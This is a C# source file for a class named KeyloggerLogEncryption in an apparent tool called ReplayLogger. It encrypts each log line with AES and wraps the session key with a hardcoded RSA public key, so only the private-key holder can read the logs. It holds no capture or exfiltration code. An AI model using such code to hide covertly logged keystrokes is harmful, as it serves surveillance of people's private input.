using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

public class KeyloggerLogEncryption
{
    private const string VersionTag = "RLK2";

    private const string RsaPublicKeyXml = "<RSAKeyValue><Modulus>2cQOyi3Qb0WhdNtjKzyPTYnyivtcKN+0YxZRXBVsq0R7ImEhBpy0AdGEGZ7iqmde30Biu0/qgej3bCBK0zP/LPXjuOZdLGYSaYPv4TUKEuiDmEfS0wVIuDw09VQO2Qzqm7a8MUVmDAJgRXtOD+VhGBVVqvz85Jer+sT7He6PF9gS28OCOgo07OsT3yNA4lvYtkZ187QHir8Yxt2YDTiUINft3DLrzTPXXjd2jKUjZ+qJfY1EzWgLJ/NYlB8ArM17iSCgtGkBwM/LYl1SVvPhKgbN1WBu/lbYqY6dXPLL0L+mPy/pObJJjakyVplQAj9FnNmaWJ0CCoPWcKlO0lT4mQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

    public sealed class Session
    {
        private readonly byte[] masterKey;
        private readonly byte[] masterIV;
        private readonly byte[] masterHmacKey;
        private long lineCounter;

        internal Session(byte[] key, byte[] iv, string sessionKeyBlob = null)
        {
            if (key == null || key.Length == 0)
            {
                throw new ArgumentException("ReplayLogger: session key is missing.", nameof(key));
            }

            if (iv == null || iv.Length == 0)
            {
                throw new ArgumentException("ReplayLogger: session IV is missing.", nameof(iv));
            }

            masterKey = (byte[])key.Clone();
            masterIV = (byte[])iv.Clone();
            masterHmacKey = DeriveHmacKey(masterKey, masterIV);
            SessionKeyBlob = string.IsNullOrWhiteSpace(sessionKeyBlob)
                ? BuildEncryptedMasterBlob(masterKey, masterIV)
                : sessionKeyBlob;
        }

        public string SessionKeyBlob { get; }

        internal bool TryExportMasterKey(out byte[] key, out byte[] iv)
        {
            key = null;
            iv = null;
            if (masterKey == null || masterKey.Length == 0 || masterIV == null || masterIV.Length == 0)
            {
                return false;
            }

            key = (byte[])masterKey.Clone();
            iv = (byte[])masterIV.Clone();
            return true;
        }

        internal bool TryGetBlockKeys(out byte[] key, out byte[] hmacKey)
        {
            key = null;
            hmacKey = null;
            if (masterKey == null || masterKey.Length == 0 || masterHmacKey == null || masterHmacKey.Length == 0)
            {
                return false;
            }

            key = (byte[])masterKey.Clone();
            hmacKey = (byte[])masterHmacKey.Clone();
            return true;
        }

        public string EncryptLog(string logData)
        {
            try
            {
                using (Aes aesAlg = Aes.Create())
                {
                    aesAlg.GenerateKey();
                    aesAlg.GenerateIV();

                    long counter = Interlocked.Increment(ref lineCounter) - 1;
                    string payloadWithCounter = $"{counter}:{logData ?? string.Empty}";
                    byte[] encryptedKey = EncryptWithMasterKey(aesAlg.Key, masterKey, masterIV);

                    byte[] encryptedData = EncryptData(payloadWithCounter, aesAlg.Key, aesAlg.IV);

                    string encryptedKeyBase64 = Convert.ToBase64String(encryptedKey);
                    string ivBase64 = Convert.ToBase64String(aesAlg.IV);
                    string encryptedDataBase64 = Convert.ToBase64String(encryptedData);
                    string hmacBase64 = Convert.ToBase64String(ComputeHmac(encryptedKey, aesAlg.IV, encryptedData, masterHmacKey));

                    return $"{encryptedKeyBase64}|{ivBase64}|{encryptedDataBase64}|{hmacBase64}";
                }
            }
            catch (Exception ex)
            {
                global::ReplayLogger.InternalDiagnostics.Info($"ReplayLogger: failed to encrypt log line: {ex.Message}");
                return null;
            }
        }
    }

    public static Session CreateSession()
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.GenerateKey();
            aesAlg.GenerateIV();
            return new Session(aesAlg.Key, aesAlg.IV);
        }
    }

    internal static bool TryCreateSession(byte[] key, byte[] iv, out Session session, string sessionKeyBlob = null)
    {
        session = null;
        if (key == null || key.Length == 0 || iv == null || iv.Length == 0)
        {
            return false;
        }

        try
        {
            session = new Session(key, iv, sessionKeyBlob);
            return true;
        }
        catch
        {
            return false;
        }
    }

    private static byte[] EncryptWithMasterKey(byte[] data, byte[] key, byte[] iv)
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = key;
            aesAlg.IV = iv;
            aesAlg.Mode = CipherMode.CBC;
            aesAlg.Padding = PaddingMode.PKCS7;

            ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

            using (MemoryStream msEncrypt = new MemoryStream())
            {
                using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                {
                    csEncrypt.Write(data, 0, data.Length);
                    csEncrypt.FlushFinalBlock();
                    return msEncrypt.ToArray();
                }
            }
        }
    }

    private static byte[] EncryptData(string data, byte[] key, byte[] iv)
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = key;
            aesAlg.IV = iv;
            aesAlg.Mode = CipherMode.CBC;
            aesAlg.Padding = PaddingMode.PKCS7;

            ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

            using (MemoryStream msEncrypt = new MemoryStream())
            {
                using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                {
                    byte[] bytes = Encoding.UTF8.GetBytes(data);
                    csEncrypt.Write(bytes, 0, bytes.Length);
                    csEncrypt.FlushFinalBlock();
                    return msEncrypt.ToArray();
                }
            }
        }
    }

    private static byte[] ComputeHmac(byte[] encryptedKey, byte[] iv, byte[] encryptedData, byte[] hmacKey)
    {
        if (hmacKey == null || hmacKey.Length == 0)
        {
            return Array.Empty<byte>();
        }

        byte[] buffer = new byte[encryptedKey.Length + iv.Length + encryptedData.Length];
        Buffer.BlockCopy(encryptedKey, 0, buffer, 0, encryptedKey.Length);
        Buffer.BlockCopy(iv, 0, buffer, encryptedKey.Length, iv.Length);
        Buffer.BlockCopy(encryptedData, 0, buffer, encryptedKey.Length + iv.Length, encryptedData.Length);

        using (HMACSHA256 hmac = new HMACSHA256(hmacKey))
        {
            return hmac.ComputeHash(buffer);
        }
    }

    private static byte[] DeriveHmacKey(byte[] key, byte[] iv)
    {
        if (key == null || iv == null)
        {
            return Array.Empty<byte>();
        }

        using (SHA256 sha = SHA256.Create())
        {
            byte[] combined = new byte[key.Length + iv.Length];
            Buffer.BlockCopy(key, 0, combined, 0, key.Length);
            Buffer.BlockCopy(iv, 0, combined, key.Length, iv.Length);
            return sha.ComputeHash(combined);
        }
    }

    private static string BuildEncryptedMasterBlob(byte[] key, byte[] iv)
    {
        try
        {
            byte[] combined = new byte[key.Length + iv.Length];
            Buffer.BlockCopy(key, 0, combined, 0, key.Length);
            Buffer.BlockCopy(iv, 0, combined, key.Length, iv.Length);

            using (RSA rsa = RSA.Create())
            {
                rsa.FromXmlString(RsaPublicKeyXml);
                byte[] encrypted = rsa.Encrypt(combined, RSAEncryptionPadding.Pkcs1);
                return $"{VersionTag}|{Convert.ToBase64String(encrypted)}";
            }
        }
        catch (Exception ex)
        {
            global::ReplayLogger.InternalDiagnostics.Error($"ReplayLogger: failed to encrypt session key; logging session cannot be started securely: {ex.Message}");
            throw new InvalidOperationException("ReplayLogger: session key blob encryption failed.", ex);
        }
    }
}



